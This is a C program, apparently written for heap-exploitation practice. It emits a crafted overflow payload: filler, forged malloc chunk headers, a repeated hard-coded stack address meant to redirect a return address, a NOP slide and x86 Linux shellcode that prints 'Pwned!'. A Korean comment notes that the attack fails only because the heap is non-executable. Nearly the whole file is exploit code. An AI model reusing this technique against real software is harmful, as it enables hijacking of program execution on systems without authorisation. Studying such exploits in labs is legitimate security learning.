/* heap에 실행 권한이 없기 때문에 exploit은 안되지만
ret 위치에 p가 대입되어 실행 흐름이 p로 옮겨지기는 한다.*/
#include <stdio.h>

#define EBPMINUS4  0xbffff374
#define N          1006

unsigned char shellcode[] =
"\xeb\x17\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x59\xb2\x06"
"\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff\x50\x77\x6e\x65"
"\x64\x21\x0a";

int main(void)
{
  int i, j;

  // Some filler for the whole ptr chunk + ptr2's prev_size
  for (i = 0; i < 1028; i++)
    putchar(0x41);

  for (i = 0; i < N - 3; i++)
  {
    fwrite("\x09\x04\x00\x00", 4, 1, stdout);
    for (j = 0; j < 1028; j++)
      putchar(0x41);
  }

  fwrite("\x09\x04\x00\x00", 4, 1, stdout);
  for (i = 0; i < (1024 / 4); i++)
  {
    putchar((EBPMINUS4 & 0x000000FF) >> 0);
    putchar((EBPMINUS4 & 0x0000FF00) >> 8);
    putchar((EBPMINUS4 & 0x00FF0000) >> 16);
    putchar((EBPMINUS4 & 0xFF000000) >> 24);
  }

  // ptr2's prev_size
  fwrite("\xeb\x16\x90\x90", 4, 1, stdout);

  // ptr2's size
  fwrite("\x15\x00\x00\x00", 4, 1, stdout);

  // NOP slide + nextchunk->size
  fwrite("\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x09\x00\x00\x00\x90\x90\x90\x90", 20, 1, stdout);

  // shellcode at the end
  fwrite(shellcode, sizeof(shellcode), 1, stdout);

  return 0;
}
